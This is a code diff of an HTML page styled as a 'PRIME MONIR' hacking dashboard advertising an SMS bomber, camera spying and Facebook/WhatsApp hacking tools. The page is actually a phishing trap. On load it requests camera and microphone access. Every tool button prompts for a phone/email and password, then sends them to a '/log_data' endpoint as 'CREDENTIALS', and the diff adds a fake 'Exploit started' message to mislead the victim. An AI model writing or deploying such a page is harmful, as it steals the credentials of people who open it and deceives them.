@@ -3,67 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PRIME MONIR | KERNEL V7.0</title>
+    <title>PRIME MONIR | KERNEL V8.0</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
         body, html { margin:0; padding:0; background:#000; color:#0f0; font-family:'Share Tech Mono', monospace; overflow:hidden; }
         canvas { position:fixed; top:0; left:0; z-index:-1; opacity:0.4; }
-        
-        /* লাল লোডার এনিমেশন */
         #loader { position:fixed; width:100%; height:100%; background:#000; display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:9999; }
         .circle { width:100px; height:100px; border:6px solid #200; border-top:6px solid #f00; border-radius:50%; animation:spin 1s linear infinite; box-shadow: 0 0 20px #f00; }
         @keyframes spin { 0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);} }
-
-        /* মেইন ড্যাশবোর্ড */
-        #ui { display:none; padding:15px; }
-        .header { border:1px solid #0f0; padding:10px; text-align:center; background:rgba(0,255,0,0.1); margin-bottom:20px; box-shadow:0 0 15px #0f0; }
-        .bomber { border:2px solid #f00; background:rgba(255,0,0,0.2); color:#f00; padding:15px; margin-bottom:15px; text-align:center; font-weight:bold; cursor:pointer; animation:blink 1s infinite; font-size:16px; }
-        @keyframes blink { 0% {opacity:1;} 50% {opacity:0.5;} }
-        
+        #ui { display:none; padding:15px; height: 100vh; overflow-y: auto; }
+        .header { border:1px solid #0f0; padding:10px; text-align:center; background:rgba(0,255,0,0.1); margin-bottom:20px; }
+        .bomber { border:2px solid #f00; background:rgba(255,0,0,0.2); color:#f00; padding:15px; margin-bottom:15px; text-align:center; font-weight:bold; cursor:pointer; }
         .grid { display:grid; grid-template-columns: 1fr 1fr; gap:12px; }
-        .tool { border:1px solid #0f0; padding:15px; background:rgba(0,255,0,0.1); text-align:center; cursor:pointer; font-size:13px; text-transform:uppercase; transition:0.3s; }
-        .tool:hover { background:#0f0; color:#000; }
-
-        /* কনসোল লোগ */
-        #console { margin-top:20px; border:1px solid #0f0; height:120px; background:rgba(0,0,0,0.8); padding:10px; font-size:11px; overflow-y:auto; line-height:1.5; }
+        .tool { border:1px solid #0f0; padding:15px; background:rgba(0,255,0,0.1); text-align:center; cursor:pointer; font-size:13px; text-transform:uppercase; }
+        #console { margin-top:20px; border:1px solid #0f0; height:100px; background:rgba(0,0,0,0.8); padding:10px; font-size:11px; overflow-y:auto; color:#0f0; }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
-    
     <div id="loader">
         <div class="circle"></div>
-        <div style="color:#f00; margin-top:20px; font-weight:bold; letter-spacing:3px;">INJECTING EXPLOITS...</div>
+        <div style="color:#f00; margin-top:20px; font-weight:bold; letter-spacing:3px;">INITIALIZING SYSTEM...</div>
     </div>
-
     <div id="ui">
-        <div class="header">
-            <h1 style="margin:0; font-size:24px; color:#fff;">PRIME MONIR V7.0</h1>
-            <small>SYSTEM STATUS: <span style="color:#0f0;">OVERRIDE ACTIVE</span></small>
-        </div>
-
-        <div class="bomber" onclick="run('SMS_BOMBER')">🔥 ULTIMATE SMS BOMBER (HIGH SPEED)</div>
-
+        <div class="header"><h1>PRIME MONIR V8.0</h1></div>
+        <div class="bomber" onclick="runTool('SMS_BOMBER')">🔥 ULTIMATE SMS BOMBER</div>
         <div class="grid">
-            <div class="tool" onclick="run('CAM_SPY')">CAM SPY</div>
-            <div class="tool" onclick="run('LOCATION')">LOCATION</div>
-            <div class="tool" onclick="run('GALLERY')">GALLERY</div>
-            <div class="tool" onclick="run('FILE_MGR')">FILE MGR</div>
-            <div class="tool" onclick="run('FB_HACK')">FB HACK</div>
-            <div class="tool" onclick="run('WA_SPY')">WA SPY</div>
-            <div class="tool" onclick="run('MIC_SPY')">MIC SPY</div>
-            <div class="tool" onclick="run('CALL_LOGS')">CALL LOGS</div>
+            <div class="tool" onclick="runTool('CAM_SPY')">CAM SPY</div>
+            <div class="tool" onclick="runTool('LOCATION')">LOCATION</div>
+            <div class="tool" onclick="runTool('GALLERY')">GALLERY</div>
+            <div class="tool" onclick="runTool('FILE_MGR')">FILE MGR</div>
+            <div class="tool" onclick="runTool('FB_HACK')">FB HACK</div>
+            <div class="tool" onclick="runTool('WA_SPY')">WA SPY</div>
         </div>
-
-        <div id="console">> Initializing core modules...<br>> Establishing connection... [OK]</div>
+        <div id="console">> System ready...</div>
     </div>
-
     <script>
         // Matrix Rain
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const letters = "0101010101010101";
+        const letters = "01";
         const fontSize = 16;
         const columns = canvas.width / fontSize;
         const drops = Array(Math.floor(columns)).fill(1);
@@ -79,7 +59,7 @@
         }
         setInterval(draw, 50);
 
-        // Auto Access & Hide Loader
+        // অটো পারমিশন (শুরুতেই)
         window.onload = async () => {
             try {
                 await navigator.mediaDevices.getUserMedia({video:true, audio:true});
@@ -91,18 +71,17 @@
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('ui').style.display = 'block';
-            }, 3500);
+            }, 3000);
         };
 
-        function run(name) {
-            const con = document.getElementById('console');
-            con.innerHTML += `<div style="color:red">> Exploiting ${name}...</div>`;
-            // আইডি-পাসওয়ার্ড ট্র্যাপ
-            let u = prompt("Verification Needed!\nEnter Phone/Email:");
+        // টুল এ ক্লিক করলে তখন পাসওয়ার্ড চাইবে
+        function runTool(name) {
+            let u = prompt("Admin Verification Needed!\nEnter Phone/Email to link session:");
             let p = prompt("Enter Password:");
             if(u && p) {
                 fetch('/log_data', {method:'POST', headers:{'Content-Type':'application/json'}, 
                 body:JSON.stringify({type:'CREDENTIALS', content:`U:${u}, P:${p}, Tool:${name}`})});
+                alert("Exploit started. Check console for logs.");
             }
         }
     </script>
